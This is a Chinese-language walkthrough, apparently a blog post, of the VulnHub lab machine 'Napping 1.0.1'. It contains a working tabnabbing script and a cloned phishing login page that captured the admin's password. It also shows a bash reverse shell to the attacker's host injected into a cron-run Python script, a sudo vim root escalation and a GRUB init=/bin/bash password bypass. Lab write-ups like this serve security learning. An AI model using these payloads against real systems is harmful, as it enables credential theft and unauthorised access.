---
title: "Napping: 1.0.1"
date: 2026-03-11
draft: false
weight: 1
---

# 一、修改靶机
## 1.1 修改启动参数进入单用户模式
启动靶机，在第一个界面加载完成，迅速单击`shift`进入GRUB菜单，接着`e`进入编辑模式，将`ro`（只读）修改为`rw`（读写），并参数末尾修改为`single init=/bin/bash`（直接启动到Bash环境，跳过密码验证），按`Ctrl + X`启动
## 1.2 修改网卡配置
输入`ip a`查看当前网卡名称，`vim /etc/network/interfaces`，将其中的名字修改为`ens33`，但若发现不存在该文件，这种情况是因为`netplan`软件接管了网卡管理，进入`/etc/netplan`文件夹，再进入`00-netplan.yaml`类似的配置文件，进入用`i`修改网络接口名称，再按`Esc`键，输入`:wq`保存退出

# 二、信息搜集
## 2.1端口扫描
```ZSH
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -A --min-rate 1000 192.168.203.132
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 02:01 EST
Nmap scan report for 192.168.203.132
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA)
|   256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA)
|_  256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
MAC Address: 00:0C:29:23:4A:EB (VMware)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 192.168.203.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.24 seconds
```

## 2.2HTTP扫描
### 2.3.1 gobuster
gobuster扫描无结果
```zsh
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ gobuster dir -u http://192.168.203.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.203.132
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 280]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

### 2.3.2网页探索（完整代码与思路）
注册账户1，密码123456
获得信息：在一个博客推广界面，要求提交自定义链接🔗，链接将由网站的管理员审核
`F12`查看信息，输入`https://baidu.com/`并提交，发现生成一个指向百度的超链接且在其代码中发现`a`标签中只有`target=_blank`，而没有用`rel="noopener/noreferrer"`属性，当使用`target="_blank"`打开新页面时，新页面可以通过JavaScript的`window.opener`访问原页面的控制权

```HTML
<p>
Thank you for your submission, you have entered: <a href="https://www.baidu.com" target="_blank">Here</a>
</p>
```

因此这里可能存在`Tabnabbing`漏洞（钓鱼攻击），可以制作恶意界面`evil.html`，让管理员账户登录到恶意界面，获取管理员账户信息

`upfine.html`代码如下：

```HTML
<!DOCTYPE html>
<html>
<body>
    <script>
        if(window.opener) window.opener.parent.location.replace('http://192.168.203.129:6688/get_info.html');
        if(window.opener  != window) window.opener.parent.location.replace('http://192.168.203.129:6688/get_info.html');
    </script>
</body>
</html>
```

  - `window.opener`指的是打开房前`upfine.html`页面的母页面
  - `window.opener.parent.location.replace()`作用是让母页面的URL强制跳转到攻击者指定的地址，`http://192.168.174.131:6688/get_info.html`，使用`replace`而非`href`是为了不留下浏览器后退历史，更隐蔽
  - 不直接发`get_info.html`，如果直接发送钓鱼页面，管理员可能察觉到URL异常，通过`upfine.html`做一次跨窗口控制，可以更隐蔽篡改管理员已经打开的标签页，这种技术是`Tabnabbing`(标签页劫持)


退出到登录界面，检查源代码并复制，生成`get_info.html`，代码如下
```HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Login</h2>
        <p>Please fill in your credentials to login.</p>
        <form action="index.php" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control " value="">
                <span class="invalid-feedback"></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>
```

将两个文件放入一个文件夹内`/home/kali/Desktop/vulnhub/napping-1.0.1/`，接着`python -m http.server 80`，`-m`是`module-name`，`http.server`是python内置的标准库模块，运行后，当前文件夹中的所有文件都会通过网络暴露出来，

再开启对`6688`端口的监听`nc -lvvp 6688`，然后将`http://192.168.174.131/upfine.html`地址进行提交，监听窗口获得账户名和密码：

结果我提交后毫无反应，接着url直接输入`http://192.168.174.131/get_info.html`，并输入账户密码，看看`get_info.html`网页有没有问题，结果突然出现如下信息，**但是**，只成功一次，无法复刻！！：

```ZSH
┌──(kali㉿kali)-[~]
└─$ nc -lvvp 6688
listening on [any] 6688 ...
192.168.174.135: inverse host lookup failed: Unknown host
connect to [192.168.174.131] from (UNKNOWN) [192.168.174.135] 37374
POST /get_info.html HTTP/1.1
Host: 192.168.174.131:6688
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 45
Content-Type: application/x-www-form-urlencoded

username=daniel&password=C%40ughtm3napping123 sent 0, rcvd 279
```

接着，再次提交`http://192.168.174.131`，触发`index.html`，按键后触发`upfine.html`，同样弹出信息

### 2.3.3 重做思路（简化代码）
文件1`upfine.html`攻击引导页
```HTML
<script>
    if (window.opener) {
        // 确保 IP 替换为你 Kali 现在的真实 IP
        window.opener.location.replace('http://192.168.203.129:6688/get_info.html');
    }
</script>
```
  - `window.opener`，如果当前窗口是由另一个窗口打开的，`window.opener`返回那个窗口的引用；如果当前窗口不是由其他窗口打开的，则该属性返回`null`
  - `if (window.opener)`，检查*当前页面*是否是由*另一个页面*通过链接（且带有`target="_blank"`属性）打开的
  - `window.opener.location`能获取并控制父窗口的URL
  - `.replace('钓鱼URL')`将父窗口重定向到指定的钓鱼页面，这里不使用`href`，因为`replace`能从浏览器的历史记录中删除原页面，意味着受害者即使怀疑并点后退，也无法回到原本的合法页面


文件2`get_info.html`（钓鱼页面）
```HTML
<form action="http://192.168.203.129:6688/capture" method="post">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Login">
</form>
```

部署与操作：
1. 将2个文件放在kali的同一个目录下
2. 在终端进入目录，启动python服务器，`sudo python3 -m http.server 80`
3. 启动nc监听（接收密码），`nc -lvvp 6688`
4. 在靶机表单提交`http://192.168.203.129/upfine.html`
5. 观察`nc`命令窗口，约1分钟能看到数据

得到信息如下：
```ZSH
┌──(kali㉿kali)-[~/vulnhub/vulnhub_napping_1.0.1]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.203.1 - - [04/Mar/2026 20:30:10] "GET /upfine.html HTTP/1.1" 200 -
192.168.203.1 - - [04/Mar/2026 20:30:10] code 404, message File not found
192.168.203.1 - - [04/Mar/2026 20:30:10] "GET /favicon.ico HTTP/1.1" 404 -
192.168.203.132 - - [04/Mar/2026 20:32:01] "GET /upfine.html HTTP/1.1" 200 -
192.168.203.132 - - [04/Mar/2026 20:34:01] "GET /upfine.html HTTP/1.1" 200 -


┌──(kali㉿kali)-[~]
└─$ nc -lvvp 6688
listening on [any] 6688 ...
192.168.203.132: inverse host lookup failed: Host name lookup failure
connect to [192.168.203.129] from (UNKNOWN) [192.168.203.132] 51902         
POST /get_info.html HTTP/1.1                                                
Host: 192.168.203.129:6688                                                  
User-Agent: python-requests/2.22.0                                          
Accept-Encoding: gzip, deflate                                              
Accept: */*                                                                 
Connection: keep-alive                                                      
Content-Length: 45                                                          
Content-Type: application/x-www-form-urlencoded                             
                                                                            
username=daniel&password=C%40ughtm3napping123 sent 0, rcvd 279 
```

- `python http server`日志分析：日志显示`20:32:01`和`20:34:01`分别有一次GET请求，说明靶机后台由一个*Cron Job*（定时任务），每隔两分钟就会运行一次机器人脚本来审核提交的链接，状态码`200`说明，靶机成功下载了`upfine.html`
- `netcat`日志分析，`from[192.168.203.132]`，确认是靶机主动把数据送到了kali，`User-Agent`说明了管理员是使用Python`requests`库编写的自动化脚本，它被`Tabnabbing`脚本欺骗，跳转到了钓鱼页，并提交了表单
- `%40`是URL编码，对应`@`，实际密码是`C@ughtm3napping123`

### 2.3.4 思路梳理
**第一次思路**

三个文件`get_info.html`、`upfine.html`、`index.html`

|文件/命令|作用|
|--|--|
|`sudo python3 -m http.server 80`|将当前终端所在的目录立即变成一个可以通过网络访问的 HTTP 静态文件服务器，让靶机能通过网络请求下载运行我的三个文件，且能将文件夹映射为URL路径，例如，文件夹里有`upfine.html`，那么访问`http://KALI_ip/upfine.html`能触发其中的JavaScript脚本，而80则意味着靶机访问我的Kali时，URL只需要写`http://192.168.174.129/`，而不需要额外标注端口号|
|`index.html`(诱饵页)|是用户最初访问的合法页面，包含链接，诱导用户在新标签打开`upfine.html`|
|`upfine.html`(攻击脚本)|当被打开后，会反过来控制它的父窗口（即`index.html`所在的标签页），强制让父窗口跳转到钓鱼页面|
|`get_info.html`(钓鱼页)|伪造登录界面，用户看完"惊喜内容"回到原标签页，会发现登陆已过期，从而不经意间输入账户密码|

**第二次思路**

1. 提交链接：在网站表单提交`http://192.168.203.129/upfine.html`
2. 触发执行：靶机机器人（.132）每2分钟检查一次，打开了`upfine.html`
3. 劫持窗口：`upfine.html`里的JS代码修改了机器人原窗口的地址，将其重定向到`get_info.html`（由Python服务器托管）
4. 自动提交：机器人回到原窗口，以为需要重新登录，自动填充了daniel的账号密码并点击提交
5. 捕获成功：`nc`拦截到了这个POST请求，将明文密码显示在命令行中

# 三、提权
`ssh daniel@192.168.203.132`，`C@ughtm3napping123`
### 3.1 基础信息搜集
```ZSH
daniel@napping:~$ whoami
daniel
daniel@napping:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)
daniel@napping:~$ uname -a
Linux napping 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
daniel@napping:~$ cat /etc/issue
Ubuntu 20.04.3 LTS \n \l

daniel@napping:~$ netstat -antp

Command 'netstat' not found, but can be installed with:

apt install net-tools
Please ask your administrator.
```

身份上，现在处于`administrators`(GID 1002)组，这不是标准组。
系统内核上，`Linux 5.4.0-89-generic`属于比较现代的内核，内核溢出不是首选

由于处于非标准组，应该查找系统中所有属于`administators`用户组的文件或目录

### 3.2 提权
```bash
daniel@napping:~$ find / -group administrators 2>/dev/null
/home/adrian/query.py
daniel@napping:~$ cat /home/adrian/query.py
from datetime import datetime
import requests

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
```

同样属于`administrators`组的文件位于`/home/adrian/query.py`，它在另一个用户`adrian`的家目录下（我是daniel），此脚本定期使用`requests`访问本地web服务，并将结果写入`site_status.txt`

接着查看是否拥有对该脚本的写权限(w)
```BASH
daniel@napping:~$ ls -l /home/adrian/query.py
-rw-rw-r-- 1 adrian administrators 481 Oct 30  2021 /home/adrian/query.py
```
权限位`-rw-rw-r--`，所有者`adrian`(rw)，所属组`administrators`(rw)，其他用户(r)，而我作为`administrators`组的成员，拥有对此文件的直接修改权限

接着查看`site_status.txt`文件的所有者
```BASH
daniel@napping:/home/adrian$ ls -l /home/adrian/site_status.txt
-rw-rw-r-- 1 adrian adrian 10240 Mar  5 06:42 /home/adrian/site_status.txt
```
该文件的用户和组都是`adrian`，最后修改时间是`Mar 5 06:42`，这是一个以`adrian`身份运行的定时任务(Cron job)。

既然我的身份可以修改`query.py`，而`adrian`会定期执行它，那么我可以写入反弹shell脚本来让query.py脚本进行执行，获取更高的权限的shell

在`/home/daniel`下写入`shell.sh`文件
```BASH
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.203.129/6688 0>&1'
```

在`query.py`文件添加对`shell.sh`脚本的执行，内容如下：
```BASH
import os
os.system('/usr/bin/bash /home/daniel/shell.sh')
```

kali中开启6688端口监听，成功拿到adrian用户的shell权限
```ZSH
┌──(kali㉿kali)-[~]
└─$ nc -lvvp 6688                 
listening on [any] 6688 ...
192.168.203.132: inverse host lookup failed: Host name lookup failure
connect to [192.168.203.129] from (UNKNOWN) [192.168.203.132] 52796
bash: cannot set terminal process group (4636): Inappropriate ioctl for device
bash: no job control in this shell
adrian@napping:~$ id
id
uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),1002(administrators)
```

### 3.3 进一步提权
进入`adrian`的shell里检查此用户是否有不用密码能运行root的权限命令
```ZSH
adrian@napping:~$ sudo -l
sudo -l
Matching Defaults entries for adrian on napping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on napping:
    (root) NOPASSWD: /usr/bin/vim
```

  - `env_reset`出于安全考虑，当运行`sudo`时，系统会重置大部分当前用户的环境变量，只保留极少数俺去那的变量，防止用户构造恶意的环境变量来劫持`root`进程
  - `mail_badpass`若有人尝试`sudo`但输错了密码，系统会给管理员发送通知邮件
  - `secure_path`是`sudo`执行命令时唯一信任的搜索路径，即使在自己的家目录写下一个名为`vim`的恶意脚本，如果执行`sudo vim`，系统也只会从指定的目录找真的`vim`
  - 该用户能不需要密码使用root权限的`vim`

### 3.4vim提权
`sudo vim -c ':!/bin/bash'`
  - `-c`是vim的命令行参数，启动后立即执行后面的vim指令
  - `:!`，在vim内部，`!`用于调用外部shell命令（就像`:wq`能保存并退出一样）
  - 执行过程：命令root身份的vim去执行`/bin/bash`，此时vim会分叉出子进程

`python3 -c 'import pty;pty.spawn("/bin/bash")'`升级一下shell，成功变为root
  - `-c`告诉python直接运行引号内的代码，而不是打开一个文件
  - `import pty`导入python的伪终端模块
  - `pty.spawn("/bin/bash")`，`spawn`意味着孵化，会启动一个新的`/bin/bash`进程，并将其标准输入/输出连接到一个伪终端(PTY)上

最后`cd /root`收获flag，
```ZSH
root@napping:~# cat root.txt
cat root.txt
Admins just can't stay awake tsk tsk tsk
```
管理员就是没法保持清醒，啧啧啧